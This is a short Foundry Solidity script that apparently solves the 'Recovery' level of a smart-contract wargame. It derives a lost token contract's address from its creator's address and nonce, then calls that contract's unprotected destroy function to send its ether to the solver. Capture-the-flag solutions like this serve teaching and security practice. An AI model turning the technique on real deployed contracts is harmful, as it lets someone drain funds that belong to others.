// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Recovery} from "../src/17_Recovery.sol";
import {Script, console} from "forge-std/Script.sol";

contract RecoverySolve is Script {
    Recovery recovery = Recovery(0xFbbd4094e208554910aE13ff0905cA80047B8B04);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        address inv1nc = vm.envAddress("MY_ADDRESS");

        console.log("Balance Before#", inv1nc.balance);
        address token = address(
            uint160(uint256(keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), address(recovery), bytes1(0x01)))))
        );
        (bool success,) = token.call(abi.encodeWithSignature("destroy(address)", payable(inv1nc)));
        require(success);
        console.log("Balance After#", inv1nc.balance);

        vm.stopBroadcast();
    }
}
